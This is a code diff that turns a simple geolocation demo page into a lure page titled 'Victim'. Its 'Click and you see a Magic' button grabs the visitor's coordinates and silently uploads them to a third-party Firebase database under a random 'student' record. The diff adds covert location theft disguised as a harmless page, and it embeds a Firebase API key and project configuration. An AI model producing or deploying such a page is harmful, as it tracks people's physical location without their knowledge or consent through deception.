@@ -1,31 +1,56 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <!-- CSS only -->
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+<title>Victim</title>
+</head>
 <body>
-
-<h2>JavaScript Gelocation</h2>
-
-<p>Click the button to get your coordinates.</p>
-
-<button onclick="getLocation()">Try It</button>
-
-<p id="demo"></p>
-
-<script>
-const x = document.getElementById("demo");
-
-function getLocation() {
-  try {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } catch {
-    x.innerHTML = err;
-  }
-}
-
-function showPosition(position) {
-  x.innerHTML = "Latitude: " + position.coords.latitude + 
-  "<br>Longitude: " + position.coords.longitude;
-}
-</script>
+  <div class="container">
+    <h1 class="mt-50">Hello Everyone</h1>
+    <button onclick="getLocation()" class="btn btn-danger">Click and you see a Magic</button>
+  </div>
+  <input type="hidden" id="latitude">
+  <input type="hidden" id="longitude">
+  <!--Firebase Libraries-->
+  <script src="https://www.gstatic.com/firebasejs/8.7.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.7.1/firebase-analytics.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.7.1/firebase-firestore.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.7.1/firebase-database.js"></script>
+  <!-- Main Script Start -->
+  <script id="MainScript">
+    var firebaseConfig = {
+      apiKey: "AIzaSyBykbWQjEL9hLvKcIpuMzLHqtsPG1GpTg0",
+      authDomain: "login-tutorial-f50b4.firebaseapp.com",
+      databaseURL: "https://login-tutorial-f50b4-default-rtdb.firebaseio.com",
+      projectId: "login-tutorial-f50b4",
+      storageBucket: "login-tutorial-f50b4.appspot.com",
+      messagingSenderId: "540835602609",
+      appId: "1:540835602609:web:b5ec11cbc6d9ae29cd0290",
+      measurementId: "G-NPYF6NJ5LF",
+    }
+    firebase.initializeApp(firebaseConfig);
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else { 
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }
+    }
+    function showPosition(position) {
+        var longitude = position.coords.latitude;
+        var latitude = position.coords.longitude;
+        document.getElementById('longitude').value=longitude;
+        document.getElementById('latitude').value=latitude;
+        // console.log(longitude);
+        // console.log(latitude);
+        i = Math.floor(Math.random() * 100000 );
+        firebase.database().ref('student/'+i).set({
+          Longitude : longitude,
+          Latitude : latitude,
+        })
+    }
+  </script>
 
 </body>
 </html>
